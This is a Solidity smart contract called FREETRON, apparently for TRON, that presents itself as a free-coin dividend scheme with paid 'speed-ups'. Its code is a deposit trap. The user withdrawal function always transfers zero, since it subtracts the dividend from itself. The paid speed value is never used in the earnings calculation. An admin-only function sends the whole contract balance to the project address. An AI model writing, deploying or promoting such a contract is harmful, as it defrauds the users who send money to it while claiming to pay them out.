//SourceUnit: freetron.sol

pragma solidity 0.5.10;


contract FREETRON {
    using SafeMath for uint256;
    
        uint256 constant public PERSENTDIV=100;
        uint256 constant public EARNSPEED = 0.0001 trx;
        
        uint256 public totalUsers;
	    uint256 public totalInvested;
	    uint256 public totalWithdrawn;
	    uint256 public totalDeposits;
	    

	    address payable public marketingAddress;
	    address payable public projectAddress;
	    address public defaultReferrer;


    struct User {
		uint256 checkpoint;
		address referrer;
        uint256 speed;
        
    }
	
	mapping (address => User) internal users;

	event Newbie(address user);
    event SpeedUp(address user);

    constructor(address payable marketingAddr, address payable projectAddr, address defaultRef) public {
	
		require(!isContract(marketingAddr) && !isContract(projectAddr));
	
		marketingAddress = marketingAddr;
		projectAddress = projectAddr;
		defaultReferrer = defaultRef;
	
	    
  	}
    
function RegisterNewFreeUser() public payable {
    require(!isContract(msg.sender)); 
    User storage user = users[msg.sender];
    user.checkpoint = block.timestamp;
	user.speed = EARNSPEED;
	totalUsers = totalUsers.add(1);
	emit Newbie(msg.sender);
}


function UserEarnSpeedUp() public payable{
    require(!isContract(msg.sender)); 
    User storage user = users[msg.sender];
    user.speed = (msg.value).div(PERSENTDIV);
	emit SpeedUp(msg.sender);

    
}

function FreeCoin_Dividend() public view returns (uint256) {
    
    User storage user = users[msg.sender];
    uint256 dividends;
    dividends = (block.timestamp.sub(user.checkpoint)).mul(EARNSPEED).div(PERSENTDIV);
	return dividends;

    
}

function GetFreeCoins() internal view returns (uint256){
    
    return address(this).balance;

    
}

function ChargeCoinByAdmin() public{
    
    require(msg.sender==projectAddress);
    msg.sender.transfer(GetFreeCoins());
    
}



function WithdrawFreeCoins() public{
    
  msg.sender.transfer(FreeCoin_Dividend().sub(FreeCoin_Dividend()));  

    
}

function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}
	
function getTotalUsers() public view returns(uint256){
    return totalUsers;
}

function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
    
}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}